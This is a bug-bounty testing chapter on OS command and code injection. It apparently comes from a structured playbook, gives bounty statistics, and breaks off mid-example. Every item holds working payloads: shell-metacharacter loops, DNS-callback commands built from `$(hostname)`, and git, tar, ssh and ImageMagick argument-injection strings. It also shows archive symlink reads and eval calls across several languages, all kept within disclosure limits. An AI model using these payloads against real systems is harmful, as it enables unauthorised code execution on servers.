# RCE · Command & code injection (RCE)

> Request data reaches a shell, a command-line tool's argument list, the language's own interpreter or a
> file-format tool, and the server runs something we chose. It pays at the top of every table when the proof is
> the output of one harmless command (`id`, `hostname`) or a DNS lookup that carries the server's host name. A
> delay, an error message, an arithmetic result or a callback without the host name is a signal, not a finding;
> a shell, a second command or a file left behind is never part of the proof.

| | |
|---|---|
| **Class** | `rce` |
| **Applies when** | http, app\|api |
| **Pays** | 606 disclosed reports, 111 paid, median $1,500, top $33,510. The best-paid web reports handed attacker-built input to a tool the server runs: git and project import ($33,510 twice), ExifTool on an uploaded image and markup-renderer options ($20,000 each), git argument lists ($12,000). Dependency confusion is the third-largest bounty and belongs to the client-side chapter. |
| **Weaknesses** | OS Command Injection · Command Injection - Generic · Code Injection · CWE-78, CWE-77, CWE-88, CWE-94 |

## Why it pays

Web applications hand the work their language does badly to programs that do it well: image and video
conversion, document conversion, archive handling, git, network diagnostics, typesetting, mail. Each call builds
a command line or a file from request data. Where the call goes through a shell, metacharacters become commands:
the IP parameter of a lookup tool (#821962, $2,000), a screenshot URL, a file extension and an asset path on one
partner site (#949361, #840243, #926169). Where it does not, a value that starts with a dash becomes an option:
git flag injection paid $12,000, $7,000 and $3,500 on one programme (#658013, #682442, #653125). Where the input
is a file, the tool's own features run it: ExifTool evaluated a DjVu annotation while removing metadata
(#1154542, $20,000), ImageMagick ran a delegate (#402362, $2,000).

The largest bounties went to features that feed attacker-built content to complex tooling on the server. GitLab
paid $33,510 twice for import paths (#1679624, #1609965), $20,000 for Kramdown options in wiki pages (#1125425)
and $12,000 each for import and traversal file writes that ended in code execution (#587854, #733072). Hosted
products pay for configuration that runs code on the provider's machines: managed Flink, Kafka Connect and
Grafana settings paid $5,000 to $6,000 each (#1418891, #1547877, #1200647). Expression features pay when the
expression leaves its vocabulary: a sift `$where` GraphQL filter ($12,000, #3782701), Painless through a sort
argument ($7,000, #3694007), PHP code injection on a sub-brand host ($3,000, #798135).

Be honest about the rest of `kb/reports/rce.md`. Of the 111 paid reports, 15 were paid by Internet Bug Bounty for
runtime and library CVEs and five are GitHub Security Lab queries and Shopify's mruby sandbox. Much of the unpaid
remainder is not a web target either: library and command-line tool bugs (the Node.js third-party modules
programme alone disclosed 63, curl 18) and desktop, browser and game clients that run code on a user's machine.
The third-largest bounty,
dependency confusion on internal package names ($30,000, #925585; also #1043385, #1007014, #1104874), is the
client-side chapter's programme-level item, and Log4Shell header spraying belongs to DSR-004 and CVE-016.

The proof that suffices is small: one command's output or one DNS lookup carrying the server's host name, rated
`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) without an account and 8.8 with a low-privilege one. Nothing more
is needed and nothing more is allowed: no shell, no second command, no file read beyond one harmless file, no
persistence, no lateral movement.

## The crux question

**Which values, uploaded files or stored fields reach a shell, a command line, an interpreter or a file-format
tool on the server, and which channel (the response, the clock, a DNS lookup at my host) shows me that a command
I chose ran there?**

## Applicability probe

The chapter gate is `http, app|api`, so it closes only for static, default-page and redirect-only assets, and the
planner writes that reason itself. The work is decided by the item gates, which come out of the map walk (PB-04):
`params` (RCE-001, 002, 003, 005, 007), `file-processing` with `upload` or `url-fetch` (RCE-004, 008, 009, 010),
`render` (RCE-011), `rich-text` (RCE-006), `reflect` or `user-content` (RCE-014), `roles` (RCE-012), the language
tags `php`, `node`, `python`, `ruby` (RCE-005), and the capabilities `oob`, `account` and `priv-accounts`.

```bash
# 1. features that usually call a system program: route, parameter and field names in the crawl, the map and the bundles
grep -rhoiE '[?&"/](ping|traceroute|nslookup|dig|whois|lookup|host|ip|domain|cmd|exec|command|run|shell|convert|resize|thumb|crop|render|pdf|latex|tex|export|import|clone|repo|git|branch|ref|mirror|archive|zip|unzip|extract|backup|restore|transcode|ffmpeg|formula|expr|expression|rule|script|plugin|install|package|cron|schedule|hook)[A-Za-z_]*["=/]' \
  "$E/recon/$H/" 2>/dev/null | tr 'A-Z' 'a-z' | sort | uniq -c | sort -rn | head -50
# 2. names of tools and engines in anything saved: error text, PDF producers, banners, User-Agents seen at the OOB host
grep -rhoaiE '(ImageMagick|GraphicsMagick|Ghostscript|ExifTool|LibreOffice|OpenOffice|unoconv|wkhtmltopdf|pdfTeX|XeTeX|LuaTeX|pandoc|Asciidoctor|docutils|kramdown|PlantUML|Lavf[0-9.]*|ffmpeg|git/[0-9.]+|sh: [0-9]+: |/bin/sh: |command not found|is not recognized as an internal or external command)[^"<]{0,40}' \
  "$E/recon/$H/" "$E/evidence/$H/" 2>/dev/null | sort | uniq -c | sort -rn | head -30
```

Upload one ordinary image and one ordinary document through every upload feature, download what comes back and
read its metadata. A re-encoded image or a PDF made from the document sets `file-processing`, and the producer
names the tool and often its version.

```bash
exiftool -a -G1 -s thumb.jpg | grep -iE 'software|producer|creator|comment'; pdfinfo converted.pdf | grep -iE 'producer|creator'
scripts/sane fact set "$H" file-processing=1 --ev "avatar re-encoded to 256x256 (bytes differ); PDF preview of uploads, Producer LibreOffice 7.5"
scripts/sane fact set "$H" render=1 --ev "certificate PDF built from the profile name; Producer pdfTeX-1.40.25"
scripts/sane fact set "$H" rich-text=1 --ev "wiki pages are AsciiDoc; POST /api/preview returns rendered HTML"
scripts/sane fact set @eng oob=1 --ev "interactsh-client answers DNS and HTTP on the engagement's OOB host"
# nothing takes input, nothing is uploaded, rendered or converted:
scripts/sane fact set "$H" params=0 upload=0 render=0 --ev "every route ignores its query string; no file input, no export, no editor"
```

With `params`, `upload`, `url-fetch`, `render`, `reflect` and `user-content` all false, every item except
RCE-012 closes as n/a. Template engines and the OGNL, SpEL and EL expression languages are the TPL chapter's;
MongoDB's own `$where` is the NSQ chapter's.

## Triage order

RCE-001 (shell metacharacters in parameters that name hosts, files and formats: cheap, no capability) → RCE-002
(the same positions blind, plus stored names that background jobs use) → RCE-003 (leading-dash values where
RCE-001 found the quoting right) → RCE-005 (eval and names of code, once the language is known) → RCE-008 (the
image upload pipeline: four files, the largest single payout in this chapter) → RCE-011 (LaTeX rendering: a
handful of requests) → RCE-014 (SSI and ESI in reflected or stored HTML) → RCE-007 (formula, rule, filter and
sort expressions) → RCE-006 (markup and diagram renderers) → RCE-009 (document converters) → RCE-012
(code-running features as a lower role) → RCE-004 (repository import) → RCE-010 (archive extraction) → RCE-013
(hosted installs and connection strings: slowest, needs two installs).

## Items

### RCE-001 · A parameter reaches a shell command line: an injected `sleep` delays the response by the number of seconds we choose

| | |
|---|---|
| **Severity** | High standalone with a delay that tracks the injected number of seconds; Critical with one command's output in the response or the host-name lookup of RCE-002 |
| **Requires** | params |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | OS Command Injection · CWE-78 |
| **Prior art** | #821962, #949361, #840243, #1360208 |

- **Where:** parameters a developer would hand to a system program. Host names and IP addresses: ping,
  traceroute, nslookup and whois tools, "test connection" and "check DNS" buttons, SMTP and LDAP server fields
  (#821962 was the IP parameter of a lookup tool). File names, extensions and formats: `filename=`, `ext=`,
  `format=`, `type=` (#840243 was an image file extension). URLs given to download, screenshot and convert
  features (#949361, a screenshot URL). Image sizes and conversion options: `size=`, `w=`, `quality=`, `crop=`.
  Paths and identifiers in partner, admin and legacy tools (#926169, an asset path), above all `.cgi`, `.pl` and
  old `.php` endpoints on hosts the main team does not maintain (#1360208). One row per parameter in
  `$E/evidence/$H/RCE-001/params.md`.
- **Test:** a shell splits the string at metacharacters, so a separator followed by `sleep N` adds N seconds only
  if a shell ran it. Close the developer's quoting (none, `'`, `"`), then chain with each separator (`;`, `|`,
  `&&`, `&`, a newline, `$()`, backticks). Three values of N (0, 5, 10) separate injection from a slow endpoint:
  the response time must follow N. Windows back ends need `&` with `ping -n` (cmd.exe) or `;` with `Start-Sleep`
  (PowerShell).
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-001"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/tools/ping"; P=host; V=127.0.0.1                 # one endpoint, one parameter, its normal value
  send() {   # $1 = label, $2 = the value sent in place of V
    curl -sS "${HDR[@]}" $A --max-time 40 --get --data-urlencode "$P=$2" "$U" -o "$D/$1.body" \
      -w "$1\t%{http_code}\t%{size_download}\t%{time_total}\n"; sleep "$W"; }
  # quoting contexts and separators; N becomes 0, 5 and 10, M becomes N+1 (the Windows ping waits M-1 seconds)
  CTX=(';sleep N;' '|sleep N' '&&sleep N' '&sleep N' $'\nsleep N\n' '$(sleep N)' '`sleep N`'
       "';sleep N;'" '";sleep N;"' '&ping -n M 127.0.0.1&' ';Start-Sleep -s N;')
  { send base "$V"; send base2 "$V"
    for i in "${!CTX[@]}"; do for n in 0 5 10; do
      p=${CTX[$i]//N/$n}; p=${p//M/$((n+1))}; send "c$i-$n" "$V$p"; done; done; } | tee "$D/$P.tsv"
  ```
  For a form body drop `--get`; for JSON send `-H 'Content-Type: application/json' -d "$(jq -nc --arg v "$2"
  '{host:$v}')"` inside `send`.
  ```text
  injected   one context reads c<i>-0 = base, c<i>-5 = base + 5 s, c<i>-10 = base + 10 s, and again on a second run
  not        every row within noise of base; every unusual value equally slow (a resolver timeout on a bad host
             name, a retry loop); every metacharacter answered by the same 403 page (the WAF, not the application)
  ```
  ```bash
  # in the context that delayed (here context 0, ';...;'): one computed marker and two read-only commands
  send out "$V;echo rce001-\$((191*7));id;hostname;"
  grep -aoE 'rce001-1337|uid=[0-9]+\([^)]*\)[^<"]{0,60}' "$D/out.body"
  # cmd.exe:  send out "$V&echo rce001-%COMPUTERNAME%&whoami&"
  ```
- **Proof:** the rows of one context in `$P.tsv` where the time follows N on two runs, next to the base rows, with
  one request and response saved raw (`curl --trace-ascii`). For Critical: `rce001-1337` in the body (the shell
  computed it, so it is not a reflection) and the output of `id` or `hostname`.
- **Not a finding when:** the response echoes the payload: `;id` in the HTML is reflection, `uid=` followed by
  digits and a user name in parentheses is output, and `rce001-$((191*7))` printed as typed is reflection. The
  `sleep 0` row is as slow as the `sleep 10` row: the whole value was resolved or retried as a host name, a
  timeout and not a shell. The delay is the same for every N: rate limiting or a tarpit. The feature is a
  terminal, notebook or online compiler that runs commands by design (Graveyard).
- **Escalate:** no output and no clean timing: RCE-002 turns the proof into a DNS lookup carrying the host name.
  Every metacharacter quoted but the value still an argument: RCE-003. Stop at `id` and `hostname`; never `cat`,
  `ls`, `env`, a download or a reverse connection. A stack trace or source file that shows the call (`exec(`,
  `system(`, `shell_exec(`, `child_process.exec(`, `Runtime.exec(`, `subprocess` with `shell=True`, `Open3`) is
  INF on its own and names the context to close.

### RCE-002 · A blind injection point makes the server resolve a DNS name whose first label is the output of `hostname`

| | |
|---|---|
| **Severity** | Critical standalone: only a command that ran on the target can put the target's host name in front of our label |
| **Requires** | params, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | OS Command Injection · CWE-78 |
| **Prior art** | #410334, #807961, #1339430, #214022 |

- **Where:** the RCE-001 positions where nothing is printed and the timing is noisy or the command runs
  asynchronously; and the values a later job puts on a command line, which no timing test reaches: names that a
  background export, archive or thumbnail job uses (#214022, a user name in an archive export), uploaded file
  names, project, branch and display names, webhook and integration settings, headers that a logging or analytics
  script processes (#1339430, the User-Agent, which we test only when the programme does not prescribe its own).
  Inject, then start the job (export, archive, regenerate, re-index) and
  wait: queues run minutes later.
- **Test:** inject a command substitution that resolves `$(hostname).<label>.$OOB`. Outbound HTTP is often
  filtered; the DNS resolver rarely is. The host name in front of our label is the proof: a WAF, mail scanner or
  log pipeline that resolves names it sees cannot know the server's host name. One label per position and
  attempt, so the log says which one fired.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-002"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/tools/ping"; P=host; V=127.0.0.1; L="rce002-$P"     # one label prefix per position
  date -u +%FT%TZ | tee -a "$D/sent-at.txt"
  # \$ keeps $(hostname) for the target's shell; $L and $OOB expand here
  for p in \
    ";nslookup \$(hostname).$L-a.$OOB;" \
    "\$(nslookup \$(hostname).$L-b.$OOB)" \
    "|ping -c 1 \$(hostname).$L-c.$OOB" \
    "\`getent hosts \$(hostname).$L-d.$OOB\`" \
    "';curl -s http://\$(hostname).$L-e.$OOB/;'" \
    "\";wget -q -O- http://\$(hostname).$L-f.$OOB/;\"" \
    "&nslookup %COMPUTERNAME%.$L-g.$OOB&" \
    ";Resolve-DnsName \"\$env:COMPUTERNAME.$L-h.$OOB\";"; do
    curl -sS "${HDR[@]}" $A --max-time 20 --get --data-urlencode "$P=$V$p" "$U" -o /dev/null -w "%{http_code} $p\n"; sleep "$W"
  done | tee -a "$D/sent.txt"
  # control: the bare name and no command; if it is resolved too, something resolves every name it sees
  curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$L-ctl.$OOB" "$U" -o /dev/null
  # stored positions: set a field a job reads, then start the job
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/me" -H 'Content-Type: application/json' \
    -d "$(jq -nc --arg n "rce002\$(nslookup \$(hostname).rce002-name.$OOB)" '{display_name:$n}')" -o /dev/null -w '%{http_code}\n'
  curl -sS "${HDR[@]}" $A -X POST "$T/api/exports" -o /dev/null -w '%{http_code}\n'
  # headers that a logging or analytics script handles; the programme's User-Agent stays as it is
  for h in Referer X-Forwarded-For; do l=$(printf '%s' "$h" | tr 'A-Z' 'a-z' | tr -cd 'a-z')
    curl -sS "${HDR[@]}" -H "$h: rce002\$(nslookup \$(hostname).rce002-$l.$OOB)" "$T/" -o /dev/null -w "%{http_code} $h\n"; sleep "$W"; done
  ```
  A host name longer than 63 characters breaks the label: use `\$(hostname|cut -c1-50)` where a pipe is allowed.
- **Proof:** the DNS query for `<host name>.rce002-<position>-<x>.$OOB` in the interactsh log, from a resolver in
  the target's address space, after the time in `sent-at.txt`, with no query for the control label; the request
  saved raw. For a stored position: the request that set the value, the request that started the job, and the
  query.
- **Not a finding when:** the query arrives without a host name in front of the label, with the literal text
  `hostname`, or the control label is resolved too: something resolved the string without running it. It arrives
  from a mail or URL scanner, a security vendor or a sandbox hours later (`third-party`). The host name is your
  own machine's: your shell expanded `$(hostname)` before sending (escape it, or put the payload in single
  quotes). It comes from a build or CI sandbox the product sells for running your code (Graveyard).
- **Escalate:** the host name is the report. If the programme asks for the user as well, one more lookup with
  `\$(whoami)` as the first label, then stop. A host name such as `ip-10-...` or a Kubernetes pod name tells the
  triager where the command ran; say so, and do not query cloud metadata or the internal network from there.

### RCE-003 · A value passed to a command-line tool as one argument becomes an option or a special file name (a leading `-`, an ImageMagick `text:` or `|` prefix) and the tool acts on it

| | |
|---|---|
| **Severity** | None standalone when only the option's harmless effect is visible (parked); High when the option reads or writes a server file we name; Critical when it runs a command (host-name lookup) |
| **Requires** | params |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Command Injection - Generic · CWE-88 |
| **Prior art** | #658013, #682442, #212696, #3633123 |

- **Where:** features that run a tool without a shell (`execFile`, `subprocess.run([...])`, `ProcessBuilder`,
  `escapeshellarg`), which is why RCE-001 found every metacharacter quoted. Repository URLs, branch, tag and ref
  names, file paths and code-search terms (git: #658013 and #653125 wrote files through a ref, #682442 went
  through code search). Host names in "add server", "test SSH" and deploy features (ssh, scp, rsync: #3518571).
  File names in "download selected as archive" (tar). URLs of download and preview features (curl, wget).
  Package names in "install package" fields of notebooks, code interpreters and function builders (pip, npm,
  gem: #3633123). Image file names, URLs and options (ImageMagick and GraphicsMagick: #212696, a crop
  parameter). Mail sender addresses (sendmail behind PHP `mail()`).
- **Test:** one argument can add one option. It works when the tool still has an operand after ours (a
  destination, an output path, a remote command, a search tree), which is how most features call these tools,
  and when nothing puts `--` (end of options) before it. Step one proves the parse with an option whose only
  effect is visible: a version banner, usage text or "unknown option" in place of the usual error. Step two
  sends the option that makes that tool resolve our name, once.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-003"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/api/repos/import"; P=url                    # the field whose value becomes one argument of the tool
  send() { curl -sS "${HDR[@]}" $A --max-time 60 -X POST "$U" -H 'Content-Type: application/json' \
    -d "$(jq -nc --arg p "$P" --arg v "$2" '{($p):$v}')" -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\n"; sleep "$W"; }
  # 1. is a leading dash parsed? a control and four harmless spellings; compare the error texts
  send ctl 'rce003-not-valid'; send v1 '--version'; send v2 '-V'; send v3 '--help'; send v4 '-h'
  grep -aoiE '(usage: *[a-z-]+|unrecognized option[^"<]{0,40}|unknown option[^"<]{0,40}|invalid option[^"<]{0,40}|git version [0-9.]+|curl [0-9]+\.[0-9]+\.[0-9]+|GNU Wget [0-9.]+|OpenSSH_[0-9.p]+|rsync +version [0-9.]+|tar \(GNU tar\) [0-9.]+|Version: ImageMagick [0-9.-]+|GraphicsMagick [0-9.]+|pip [0-9.]+ from)' "$D"/*.body | sort -u
  ```
  ```text
  tool, where it reads our value            step 2: one argument (OOB = the callback host)
  git clone/fetch/ls-remote: URL           --upload-pack=nslookup $(hostname).rce003-git.OOB;true
                                           (runs on the target only when the next operand is a repository opened locally: file:// or a path)
  git grep: search term                    --open-files-in-pager=nslookup $(hostname).rce003-grep.OOB;true
  git log/diff/show: ref or path           parse check --pretty=format:rce003 ; --output=<path> writes a file: do not
  ssh/scp/sftp: host                       -oProxyCommand=nslookup $(hostname).rce003-ssh.OOB
  rsync: source or destination             --rsh=sh -c 'nslookup $(hostname).rce003-rsync.OOB'   (only when one side is host:path)
  GNU tar: file names in a batch           two file names: --checkpoint=1 and --checkpoint-action=exec=nslookup $(hostname).rce003-tar.OOB
  pip/npm/gem: one of several names        --index-url=http://rce003-pip.OOB/simple/  --registry=http://rce003-npm.OOB/  --source=http://rce003-gem.OOB/
                                           (the installer fetches from us: flag injection shown, nothing run yet)
  ImageMagick: input file name or URL      text:/etc/hostname renders the file into the output image (read)
                                           |nslookup $(hostname).rce003-im.OOB opens a pipe where the build and policy allow it
  ffmpeg: input URL                        protocols and playlists that read local files: SSR-008 and the LFI chapter
  curl/wget: URL                           parse check only (-V, --version); -o<path> writes a file: do not
  sendmail via PHP mail(): sender          -X<path> logs the session to a file, Exim -be expands ${run{...}}: CVE chapter (CVE-2016-10033)
  ```
  ```bash
  # 2. the one line for the tool step 1 named; \$ keeps $(hostname) for the target
  send git "--upload-pack=nslookup \$(hostname).rce003-git.$OOB;true"
  # tar through file names: upload two files with these names, then request the archive of both
  printf x > "$D/x.txt"
  for n in '--checkpoint=1' "--checkpoint-action=exec=nslookup \$(hostname).rce003-tar.$OOB"; do
    curl -sS "${HDR[@]}" $A -F "file=@$D/x.txt;filename=\"$n\"" "$T/api/files" -o /dev/null -w '%{http_code}\n'; sleep "$W"; done
  ```
- **Proof:** step one's version banner or usage text where the control gives the normal error (the primitive),
  then the host-name DNS query for the option's label with the request that carried it. For an installer flag:
  the installer's request to our host (User-Agent `pip/`, `npm/`, `Ruby, RubyGems/`), which shows we choose where
  code is installed from. For `text:`, the output image with the server's host name rendered in it.
- **Not a finding when:** the value is refused with the same validation error as any malformed input (a URL
  parser, a ref-name check); `--` precedes it; the banner comes from the application's own `/version` route; the
  operand after ours is missing, so the tool prints usage and exits before acting (the parse is proven and the
  option did nothing: parked); `text:` is rendered as a caption because the value was used as text, not as a file
  name; the installer fetched from our index inside a sandbox the product sells for running your code
  (Graveyard).
- **Escalate:** an index under our control serves the RCE-013 probe package for the execution proof. `--output`
  and `-o` writes go through RCE-010's rule (a new file name in a served directory, never an existing file). Git
  features: RCE-004. An option that puts a server file into the response follows the LFI chapter's proof rules.
  A mail field that also takes CRLF is the CRL chapter's (#1200647).

### RCE-004 · A repository import or mirror runs git on our URL or our project archive, and a transport, a submodule or an archive entry runs a command on the import worker

| | |
|---|---|
| **Severity** | Critical standalone with the host-name lookup from the import worker; High when an archive symlink only reads a server file into the imported project; none for git fetching our repository, which is the feature |
| **Requires** | url-fetch\|upload, file-processing, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Command Injection - Generic · CWE-77 |
| **Prior art** | #1679624, #1609965, #378148, #1132378 |

- **Where:** "import project or repository by URL", repository mirroring, "connect a Git repository" in CI,
  static-site, documentation and package-build services, importers from GitHub, GitLab or Bitbucket (#1679624),
  "import from export file" (a `.tar.gz` that carries a repository bundle, uploads and metadata: #1609965,
  #378148, #1132378), theme and plugin installers that clone. Import our own public repository once first and
  read the worker's request at the OOB host: `User-Agent: git/2.39.2` gives the git version, and the source
  address shows whether the worker sits inside the target's network.
- **Test:** the worker trusts four things it should not: the URL's transport (`ext::` runs a program, `file://`
  and bare paths open repositories on the worker's disk), a leading dash (RCE-003's `--upload-pack=`), the
  submodules of the repository (clone-time CVEs of the worker's git version), and the entries of an export
  archive (symlinks that read, `../` names that write, a bundled `.git/config` whose `core.fsmonitor` command git
  runs when the importer next calls git in that tree). Prove execution with one host-name lookup and reads with
  `/etc/hostname`. Never write a file outside the import: the `authorized_keys` overwrite of #298873 is
  persistence; describe it, do not do it.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-004"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  imp() { curl -sS "${HDR[@]}" $A --max-time 90 -X POST "$T/api/projects/import" -H 'Content-Type: application/json' \
    -d "$(jq -nc --arg u "$2" --arg n "rce004-$1" '{name:$n, import_url:$u}')" -o "$D/$1.body" -w "$1\t%{http_code}\n"; sleep "$W"; }
  imp ua   "http://rce004-ua.$OOB/rce004.git"                           # 0. User-Agent and source address in the OOB HTTP log
  imp ext  "ext::sh -c nslookup% \$(hostname).rce004-ext.$OOB"          # 1. ext transport ("% " is a space inside ext:: URLs)
  imp file "file:///etc"                    # "not a git repository" = local transport allowed; "transport 'file' not allowed" = refused
  imp dash "--upload-pack=nslookup \$(hostname).rce004-dash.$OOB;true"  #    leading dash
  # 2. export archive: an export of our own project, a symlink to /etc/hostname where the importer copies a file, re-imported
  mkdir -p "$D/exp" && tar xzf "$D/our-export.tar.gz" -C "$D/exp"
  f=$(cd "$D/exp" && find . -type f -path '*upload*' | head -1); echo "replacing $f"
  rm "$D/exp/$f" && ln -s /etc/hostname "$D/exp/$f"
  tar czf "$D/rce004-link.tar.gz" -C "$D/exp" .
  curl -sS "${HDR[@]}" $A -F "file=@$D/rce004-link.tar.gz" -F 'name=rce004-link' "$T/api/projects/import/file" -o "$D/link.body" -w '%{http_code}\n'
  ```
  Then open the imported attachment: its content is the worker's host name if the symlink was followed. Git
  before 2.14.1 also passed `ssh://-oProxyCommand=...` hosts to ssh as an option (CVE-2017-1000117). If the
  archive format carries a working tree with its `.git` directory, set the hook command last, with
  `git config --file "$D/exp/<tree>/.git/config" core.fsmonitor "nslookup \$(hostname).rce004-fsm.$OOB; false"`,
  and run no git command inside that tree afterwards (a git-aware shell prompt counts: it would fire on your own
  machine). For clone-time bugs, the version from step 0 goes through the CVE chapter (submodule and symlink
  handling: CVE-2024-32002 on case-insensitive file systems, CVE-2025-48384 for recursive clones before 2.50.1
  and the matching maintenance releases); use the advisory's repository layout with its hook replaced by one
  host-name lookup.
- **Proof:** the host-name query for the variant's label, from the import worker's address, after the import
  request, with the URL or archive used and the import request and response. For a read: the imported attachment
  whose content is the worker's `/etc/hostname`, with the archive listing (`tar tvzf`) showing the symlink.
- **Not a finding when:** the only callback is git fetching our repository
  (`GET /rce004.git/info/refs?service=git-upload-pack`). `ext::` fails with "transport 'ext' not allowed", the
  default since 2017. The repository viewer shows a symlink object pointing at `/etc/hostname`: git stores links
  as links, and the proof needs the target's bytes. The import runs in the CI runner that executes the
  repository's own pipeline by design (Graveyard).
- **Escalate:** `../` entries that land outside the import directory: RCE-010. Local transport accepted: the
  worker can open other projects' repositories on its disk, the #1685822 class ($22,300); prove it only with a
  repository of our own whose path the product shows, never another tenant's. An import URL pointed at an
  internal address is SSR-003. Version-specific git CVEs: CVE chapter.

### RCE-005 · A parameter is evaluated as code by the PHP, Node, Python or Ruby back end, or names the function, class or module the back end calls

| | |
|---|---|
| **Severity** | Critical standalone once one language call returns the host name; a computed value alone is the signal, not the report |
| **Requires** | params, php\|node\|python\|ruby |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Code Injection · CWE-95 |
| **Prior art** | #798135, #1652042, #1092574, #1154034 |

- **Where:** parameters that are code or name code. Calculator, converter and "expression" fields that the
  product does not document as a formula language (those that it documents are RCE-007). Names: `callback=`,
  `fn=`, `func=`, `method=`, `action=`, `handler=`, `class=`, `type=`, `module=`, `driver=`; `lang=` and
  `locale=` values that load a file by name (`require`, `import()`, `importlib`); transformation and option
  names that a library calls by name (#1652042 and #1154034, image transformation names in Rails Active
  Storage); preview and translation endpoints of CMS products (#1092574, #1093444); debug endpoints left in
  (`/eval`, `/console`, `/debug`). The sinks behind them: PHP `eval`, `assert` on a string (before PHP 8),
  `preg_replace` with `/e` (before PHP 7), `create_function`, `call_user_func`, `$f()`; Node `eval`,
  `new Function`, `vm.runIn*`, `setTimeout` with a string, `require` of a variable; Python `eval`, `exec`,
  `compile`, `getattr`, `importlib.import_module`; Ruby `eval`, `instance_eval`, `class_eval`, `send`,
  `public_send`, `constantize`.
- **Test:** send an expression that is valid in the back end's language and whose value differs from its text:
  `191*7` must come back as `1337`, a string concatenation in that language's syntax as `rce005`, an unbalanced
  quote as a parse error that names the interpreter. The concatenations below discriminate: each yields `rce005`
  in one language only. For a value that names code, a name that cannot exist (`rce005Missing`) gives "undefined
  function", "undefined method", "uninitialized constant" or "No module named" when the value is resolved as
  code; then a real function without arguments that returns the host name.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-005"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  U="$T/api/calc"; P=expr; V=1                                # endpoint, parameter, its normal value
  e() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$2" "$U" -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\n"; sleep "$W"; }
  e base "$V"; e mul '191*7'; e brk "'"
  e php "'rce'.'005'"; e js "'rce'+0+0+5"; e py "'rce'+str(5).zfill(3)"; e rb '"rce"<<"005"'
  grep -aoE '1337|rce005|Parse error[^<]{0,80}|syntax error[^<]{0,80}|SyntaxError[^<]{0,80}|NameError[^<]{0,60}|unexpected [^<]{0,40}' "$D"/*.body | sort -u
  # one call that returns the host name, in the language that answered
  e php-host 'gethostname()'
  e js-host  "require('os').hostname()"          # new Function and vm see no require: process.mainModule.require('os').hostname()
  e py-host  "__import__('socket').gethostname()"
  e rb-host  'require("socket");Socket.gethostname'
  # a value that names code
  e miss 'rce005Missing'
  e name 'gethostname'                           # PHP call_user_func and $f(): the host name comes back if the name is called
  ```
  ESM back ends have no `require` at all: `process.getBuiltinModule('os').hostname()` (Node 20.16 and later).
- **Proof:** the computed value next to the base response, and one call's output, the host name, with request and
  response saved raw. For a name sink: the missing-name error, then the host name from the named function.
- **Not a finding when:** a calculator library with its own grammar evaluated the value (`mathjs`, `expr-eval`, a
  formula engine): RCE-007. A template computed `1337` (`{{191*7}}` is the TPL chapter). The evaluation happened
  in the browser (client-side eval is XSS). A JSONP `callback` name is reflected into JavaScript (XSS, not a call
  on the server). The missing-name error comes from a router or an allow-list lookup ("unknown action"), not
  from the language.
- **Escalate:** stop at the host name, and report the language and the sink if an error or the source shows
  them. Ruby `send` reaches private methods, `Kernel#system` included, and PHP `$f($a)` calls any function, so a
  second parameter that becomes the argument turns a name sink into a command: prove it with one host-name
  lookup, nothing more. A `require` or `include` of a name joined to a path is the LFI chapter's, and with a file
  we uploaded (UPL) it is code execution.

### RCE-006 · A server-side markup or diagram renderer honours a directive in our text: an include reads a server file, an option names a class, or an embedded block runs code

| | |
|---|---|
| **Severity** | High standalone for a server file included in the rendered output; Critical when a directive runs code (host-name lookup or output); none for markup rendered as designed |
| **Requires** | rich-text |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Code Injection · CWE-94 |
| **Prior art** | #1125425, #1401444, #2438265, #1098793 |

- **Where:** text the server turns into HTML or images: wiki pages, README and documentation renderers, issue and
  comment bodies whose HTML comes back from a `preview` or `render` endpoint, documentation builders (AsciiDoc,
  reStructuredText, RDoc, Org, Textile, MediaWiki markup), diagram blocks (PlantUML, Graphviz, Kroki). Server or
  browser: if the API returns rendered HTML for our markup, the server rendered it; if it returns the markup and
  a bundle (marked, markdown-it, remark) renders it, this card does not apply and the XSS chapter does. Prior
  art: Kramdown options in wiki pages (#1125425, $20,000), a wiki renderer's scripting extension (#1401444), an
  RDoc options file (#2438265), Kroki file read and write (#1098793).
- **Test:** markup languages have directives that reach the file system or the runtime, and each renderer has a
  safe mode that turns them off. Asciidoctor `include::` (on in `unsafe` mode, jailed in `safe`); docutils
  `.. include::` and `.. raw:: html` with `:file:` (on unless `file_insertion_enabled` is off); Kramdown
  `{::options /}` inline options (before kramdown 2.3.1 a Rouge formatter option could name any Ruby class:
  CVE-2021-28834); PlantUML `!include` and `!includeurl` (by security profile); Org `#+INCLUDE:`. A file that
  cannot exist shows whether the directive was processed before a real file is read.
- **How:**
  ```bash
  D="$E/evidence/$H/RCE-006"; mkdir -p "$D"; W=$(awk "BEGIN{print 1/$RATE}")
  pv() { curl -sS "${HDR[@]}" $A -X POST "$T/api/markup/preview" -H 'Content-Type: application/json' \
    -d "$(jq -nc --arg t "$2" --arg f "$3" '{text:$t, format:$f}')" -o "$D/$1.html" -w "$1\t%{http_code}\t%{size_download}\n"; sleep "$W"; }
  # each pair: a file that cannot exist (was the directive processed?), then /etc/hostname
  pv adoc-miss $'rce006a\n\ninclude::/rce006-missing[]\n\nrce006b' asciidoc
